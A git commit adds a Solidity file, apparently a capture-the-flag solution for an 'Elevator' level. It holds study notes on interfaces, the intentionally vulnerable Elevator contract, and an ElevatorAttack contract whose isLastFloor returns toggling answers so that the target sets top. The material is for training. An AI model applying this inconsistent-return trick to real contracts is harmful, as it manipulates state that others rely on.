216c436a4de79acc4dcece38616deb56570c494b
Vishal Pokharel <86221351+VishalPokharel@users.noreply.github.com>
2023-02-08 07:58:58 +0545

    Create 11_Elevator.sol

---
+++ 11_Elevator.sol
@@ -0,0 +1,67 @@
+/* 
+INTERFACES
+-All declared functions must be external in the interface, even if they are public in contract.
+-All functions declared in interfaces are implicitly virtual and any functions that override them do not need the
+override keyword.
+
+View Functions
+-Functions can be declared view in which case they promise not to modify the state.
+
+Pure Functions
+-Functions can be declared pure in which case they promise not to read from or modify the state.
+
+Libraries
+-Library functions can only be called directly (i.e. without the use of DELEGATECALL) if they do not
+modify the state (i.e. if they are view or pure functions), because libraries are assumed to be stateless.
+
+*/
+
+
+//elevator.sol
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface Building {
+  function isLastFloor(uint) external returns (bool);
+}
+
+
+contract Elevator {
+  bool public top;
+  uint public floor;
+
+  function goTo(uint _floor) public {
+    Building building = Building(msg.sender);
+
+    if (! building.isLastFloor(_floor)) {
+      floor = _floor;
+      top = building.isLastFloor(floor);
+    }
+  }
+}
+
+//elevatorAttack.sol
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract ElevatorAttack{
+  Elevator public target;
+  bool public toggle = true;
+
+
+  constructor(address _target) public{
+    target = Elevator(_target);
+  }
+  
+  function isLastFloor(uint )public returns(bool) {
+    toggle = !toggle;
+    return toggle;
+   }
+   
+   function setTop(uint _floor) public {
+    target.goTo(_floor);
+    }
+ }
+  
+
